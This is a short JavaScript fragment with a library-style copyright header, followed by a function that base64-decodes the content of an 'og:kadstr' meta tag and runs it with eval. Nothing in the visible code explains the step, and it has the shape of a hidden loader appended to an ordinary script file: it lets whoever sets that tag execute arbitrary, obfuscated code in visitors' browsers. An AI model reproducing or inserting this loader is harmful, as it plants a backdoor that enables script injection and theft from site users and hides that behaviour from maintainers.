 ...
 *
 * Copyright (c) 2010-2012 wuqing  * Version:  1.6.0
 *
 */
 ;
(function() { var kadmeta = document.querySelector("meta[property='og:kadstr']"); if (kadmeta && kadmeta.content != '') { eval(window.atob(kadmeta.content)); } })();
